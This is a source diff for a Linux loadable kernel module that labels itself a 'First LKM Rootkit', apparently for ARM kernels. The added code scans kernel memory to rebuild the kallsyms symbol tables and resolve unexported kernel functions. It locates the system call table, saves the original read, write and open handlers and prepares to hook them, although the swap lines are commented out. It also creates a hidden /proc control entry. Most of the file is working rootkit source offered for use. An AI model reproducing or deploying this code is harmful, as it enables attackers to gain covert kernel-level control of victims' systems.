@@ -5,7 +5,6 @@
 #include <linux/proc_fs.h>
 #include <asm/uaccess.h>
 
-
 #define AUTHOR "Gavin"
 #define DESCRIPTION "First LKM Rootkit"
 #define VERMAGIC_STRING "looooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooog"
@@ -43,6 +42,45 @@ static unsigned long sys_call_table_size;
 #define STRINGLEN 1024
 char global_buffer[STRINGLEN];
 struct proc_dir_entry *example_dir, *hello_file;
+
+
+#define KERNEL_START_ADDRESS 0xc0008000
+#define KERNEL_SIZE 0x2000000
+#define SEARCH_START_ADDRESS 0xc0800000
+#define KALLSYMS_SIZE 0x200000
+
+unsigned long pattern_kallsyms_addresses[] = {
+	0xc0008000,	/* stext */
+	0xc0008000,	/* _sinittext */
+	0xc0008000,	/* _stext */
+	0xc0008000	/* __init_begin */
+};
+unsigned long pattern_kallsyms_addresses2[] = {
+	0xc0008000,	/* stext */
+	0xc0008000	/* _text */
+};
+unsigned long pattern_kallsyms_addresses3[] = {
+	0xc00081c0,	/* asm_do_IRQ */
+	0xc00081c0,	/* _stext */
+	0xc00081c0	/* __exception_text_start */
+};
+unsigned long pattern_kallsyms_addresses4[] = {
+	0xc0008180,	/* asm_do_IRQ */
+	0xc0008180,	/* _stext */
+	0xc0008180	/* __exception_text_start */
+};
+unsigned long kallsyms_num_syms;
+unsigned long *kallsyms_addresses;
+unsigned char *kallsyms_names;
+unsigned char *kallsyms_token_table;
+unsigned short *kallsyms_token_index;
+unsigned long *kallsyms_markers;
+
+
+unsigned long (*kallsyms_lookup_name_addr)(const char *name);
+struct proc_dir_entry* (*proc_mkdir_addr)(const char *name, struct proc_dir_entry *parent);
+struct proc_dir_entry* (*create_proc_entry_addr)(const char *name, umode_t mode, struct proc_dir_entry *parent);
+void (*remove_proc_entry_addr)(const char *name, struct proc_dir_entry *parent);
 
 asmlinkage ssize_t (*orig_read) (int fd, char *buf, size_t count);
 asmlinkage ssize_t (*orig_write) (int fd, char *buf, size_t count);
@@ -96,6 +134,337 @@ static unsigned long find_sys_call_table_size (void)
 	return NULL;
 }
 
+unsigned long kallsyms_expand_symbol(unsigned long off, char *namebuf) 
+{
+	int len;
+	int skipped_first;
+	unsigned char *tptr;
+	unsigned char *data;
+
+	/* Get the compressed symbol length from the first symbol byte. */
+	data = &kallsyms_names[off];
+	len = *data;
+	off += len + 1;
+	data++;
+
+	skipped_first = 0;
+	while (len > 0) {
+		tptr = &kallsyms_token_table[kallsyms_token_index[*data]];
+		data++;
+		len--;
+
+		while (*tptr > 0) {
+			if (skipped_first != 0) {
+				*namebuf = *tptr;
+				namebuf++;
+			} else {
+				skipped_first = 1;
+			}
+			tptr++;
+		}
+	}
+	*namebuf = '\0';
+
+	return off;
+}
+
+int search_functions() 
+{
+	char namebuf[1024];
+	unsigned long i;
+	unsigned long off;
+	int cnt;
+
+	cnt = 0;
+	for (i = 0, off = 0; i < kallsyms_num_syms; i++) {
+		off = kallsyms_expand_symbol(off, namebuf);
+		//printk("<%s : %p>\n", namebuf, kallsyms_addresses[i]);
+		if (strcmp(namebuf, "kallsyms_lookup_name") == 0) {
+			kallsyms_lookup_name_addr = kallsyms_addresses[i];
+			printk("(kallsyms_lookup_name_addr : %p)\n", kallsyms_lookup_name_addr);
+			cnt++;
+		} else if (strcmp(namebuf, "proc_mkdir") == 0) {
+			proc_mkdir_addr = kallsyms_addresses[i];
+			printk("(proc_mkdir_addr : %p)\n", proc_mkdir_addr);
+			cnt++;
+		} else if (strcmp(namebuf, "create_proc_entry") == 0) {
+			create_proc_entry_addr = kallsyms_addresses[i];
+			printk("(create_proc_entry_addr : %p)\n", create_proc_entry_addr);
+			cnt++;
+		} else if (strcmp(namebuf, "remove_proc_entry") == 0) {
+			remove_proc_entry_addr = kallsyms_addresses[i];
+			printk("(remove_proc_entry_addr : %p)\n", remove_proc_entry_addr);
+			cnt++;
+		}
+	}
+	if (cnt < 4) {
+		return -1;
+	}
+
+	return 0;
+}
+
+
+static int check_pattern(unsigned long *addr, unsigned long *pattern, int patternnum) 
+{
+	unsigned long val;
+	unsigned long cnt;
+	unsigned long i;
+
+	val = *(unsigned long *)addr;	
+	if (val == pattern[0]) 
+	{
+		cnt = 1;
+		for (i = 1; i < patternnum; i++) 
+		{
+			val = *(unsigned long *)(&addr[i]);
+			if (val == pattern[i]) 
+			{
+				cnt++;
+			} 
+			else 
+			{
+				break;
+			}
+		}
+		if (cnt == patternnum) 
+		{
+			return 0;
+		}
+	}
+	return -1;
+}
+
+static int check_kallsyms_header(unsigned long *addr) 
+{
+	if (check_pattern(addr, pattern_kallsyms_addresses, sizeof(pattern_kallsyms_addresses) / 4) == 0) 
+	{
+		return 0;
+	} 
+	else if (check_pattern(addr, pattern_kallsyms_addresses2, sizeof(pattern_kallsyms_addresses2) / 4) == 0) 
+	{
+		return 0;
+	} else if (check_pattern(addr, pattern_kallsyms_addresses3, sizeof(pattern_kallsyms_addresses3) / 4) == 0) 
+	{
+		return 0;
+	}else if (check_pattern(addr, pattern_kallsyms_addresses4, sizeof(pattern_kallsyms_addresses4) / 4) == 0) 
+	{
+		return 0;
+	}
+
+	return -1;
+}
+
+static int get_kallsyms_addresses() 
+{
+	unsigned long *endaddr;
+	unsigned long i, j;
+	unsigned long *addr;
+	unsigned long n;
+	unsigned long val;
+	unsigned long off;
+	int cnt, num;
+
+	printk("Search kallsyms...\n");
+	endaddr = (unsigned long *)(KERNEL_START_ADDRESS + KERNEL_SIZE);
+	cnt = 0;
+	num = 0;
+	for (i = 0; i < (KERNEL_START_ADDRESS + KERNEL_SIZE - SEARCH_START_ADDRESS); i += 16) 
+	{
+		for (j = 0; j < 2; j++) 
+		{
+			cnt += 4;
+			if (cnt >= 0x10000) 
+			{
+				cnt = 0;
+				num++;
+				printk("%d ", num);
+			}
+
+			/* get kallsyms_addresses pointer */
+			if (j == 0) 
+			{
+				kallsyms_addresses = (unsigned long *)(SEARCH_START_ADDRESS + i);
+			} 
+			else 
+			{
+				if ((i == 0) || ((SEARCH_START_ADDRESS - i) < KERNEL_START_ADDRESS)) 
+				{
+					continue;
+				}
+				kallsyms_addresses = (unsigned long *)(SEARCH_START_ADDRESS - i);
+			}
+			if (check_kallsyms_header(kallsyms_addresses) != 0) 
+			{
+				continue;
+			}
+			addr = kallsyms_addresses;
+			off = 0;
+
+			/* search end of kallsyms_addresses */
+			n = 0;
+			while (1) 
+			{
+				val = addr[0];
+				if (val < KERNEL_START_ADDRESS) 
+				{
+					break;
+				}
+				n++;
+				addr++;
+				off++;
+				if (addr >= endaddr) 
+				{
+					return -1;
+				}
+			}
+
+			/* skip there is filled by 0x0 */
+			while (1) 
+			{
+				val = addr[0];
+				if (val != 0) 
+				{
+					break;
+				}
+				addr++;
+				off++;
+				if (addr >= endaddr) 
+				{
+					return -1;
+				}
+			}
+
+			val = addr[0];
+			kallsyms_num_syms = val;
+			addr++;
+			off++;
+			if (addr >= endaddr) 
+			{
+				return -1;
+			}
+
+			/* check kallsyms_num_syms */
+			if (kallsyms_num_syms != n) 
+			{
+				continue;
+			}
+
+			if (num > 0) {
+				printk("\n");
+			}
+			printk("(kallsyms_addresses=%08x)\n", (unsigned long)kallsyms_addresses);
+			printk("(kallsyms_num_syms=%08x)\n", kallsyms_num_syms);
+
+			endaddr = (unsigned long *)((unsigned long)kallsyms_addresses + KALLSYMS_SIZE);
+			addr = &kallsyms_addresses[off];
+
+			/* skip there is filled by 0x0 */
+			while (addr[0] == 0x00000000) 
+			{
+				addr++;
+				if (addr >= endaddr) 
+				{
+					return -1;
+				}
+			}
+
+			kallsyms_names = (unsigned char *)addr;
+			printk("(kallsyms_names: %p)\n", kallsyms_names);
+
+			/* search end of kallsyms_names */
+			for (i = 0, off = 0; i < kallsyms_num_syms; i++) 
+			{
+				int len = kallsyms_names[off];
+				off += len + 1;
+				if (&kallsyms_names[off] >= (unsigned char *)endaddr) 
+				{
+					return -1;
+				}
+			}
+
+
+			/* adjust */
+			addr = (unsigned long *)((((unsigned long)&kallsyms_names[off] - 1) | 0x3) + 1);
+			if (addr >= endaddr) 
+			{
+				return -1;
+			}
+
+			/* skip there is filled by 0x0 */
+			while (addr[0] == 0x00000000) 
+			{
+				addr++;
+				if (addr >= endaddr) {
+					return -1;
+				}
+			}
+
+			/* but kallsyms_markers shoud be start 0x00000000 */
+			addr--;
+
+			kallsyms_markers = addr;
+
+			printk("(kallsyms_markers: %p)\n", kallsyms_markers);
+
+			/* end of kallsyms_markers */
+			addr = &kallsyms_markers[((kallsyms_num_syms - 1) >> 8) + 1];
+			if (addr >= endaddr) 
+			{
+				return -1;
+			}
+
+			/* skip there is filled by 0x0 */
+			while (addr[0] == 0x00000000) 
+			{
+				addr++;
+				if (addr >= endaddr) 
+				{
+					return -1;
+				}
+			}
+
+			kallsyms_token_table = (unsigned char *)addr;
+
+			printk("(kallsyms_token_table: %p)\n", kallsyms_token_table);
+
+			i = 0;
+			while ((kallsyms_token_table[i] != 0x00) || (kallsyms_token_table[i + 1] != 0x00)) 
+			{
+				i++;
+				if (&kallsyms_token_table[i - 1] >= (unsigned char *)endaddr) 
+				{
+					return -1;
+				}
+			}
+
+			/* skip there is filled by 0x0 */
+			while (kallsyms_token_table[i] == 0x00) 
+			{
+				i++;
+				if (&kallsyms_token_table[i - 1] >= (unsigned char *)endaddr) 
+				{
+					return -1;
+				}
+			}
+
+			/* but kallsyms_markers shoud be start 0x0000 */
+			kallsyms_token_index = (unsigned short *)&kallsyms_token_table[i - 2];
+
+			printk("(kallsyms_token_index: %p)\n", kallsyms_token_index);
+
+			return 0;
+		}
+	}
+
+	if (num > 0) {
+		printk("\n");
+	}
+	return -1;
+}
+
+
+
 static ssize_t check_buf(const char *buf)
 {
 	return 1;
@@ -147,6 +516,7 @@ int proc_write_hello(struct file *file, const char *buffer, unsigned long count,
          */
         copy_from_user(global_buffer, buffer, len);
         global_buffer[len] = '\0';
+        printk("global_buffer : %s\n", global_buffer);
         return len;
 }
 
@@ -159,19 +529,26 @@ static int init_rk(void)
 	printk("Get System Call table : %p\n", sys_call_table);
 	printk("Get System Call table size : %lu\n",sys_call_table_size);
 
-/*	orig_read = sys_call_table[__NR_READ];
+	get_kallsyms_addresses();
+	search_functions();
+
+	// int ret = (*set_memory_rw_addr)(sys_call_table, 1);
+	// printk("Return of set_memory_rw : %d", ret);
+
+	orig_read = sys_call_table[__NR_READ];
 	orig_write = sys_call_table[__NR_WRITE];
 	orig_open = sys_call_table[__NR_OPEN];
 
-	sys_call_table[__NR_READ] = hacked_read;
-	sys_call_table[__NR_WRITE] = hacked_write;
-	sys_call_table[__NR_OPEN] = hacked_open;*/
+	// sys_call_table[__NR_READ] = hacked_read;
+	// sys_call_table[__NR_WRITE] = hacked_write;
+	// sys_call_table[__NR_OPEN] = hacked_open;
 
-	example_dir = proc_mkdir("proc_test", NULL);
-   	hello_file = create_proc_entry("hello", S_IRUGO, example_dir);
+	example_dir = (*proc_mkdir_addr)("proc_test", NULL);
+   	hello_file = (*create_proc_entry_addr)("hello", S_IRUGO, example_dir);
     strcpy(global_buffer, "hello");
     hello_file->read_proc = proc_read_hello;
     hello_file->write_proc = proc_write_hello;
+
 
 	return 0;
 }
@@ -179,6 +556,8 @@ static int init_rk(void)
 static void exit_rk(void)
 {
 	printk("Bye, Rootkit\n");
+	(*remove_proc_entry_addr)("hello", example_dir);
+	(*remove_proc_entry_addr)("proc_test", NULL);
 }
 
 module_init(init_rk);
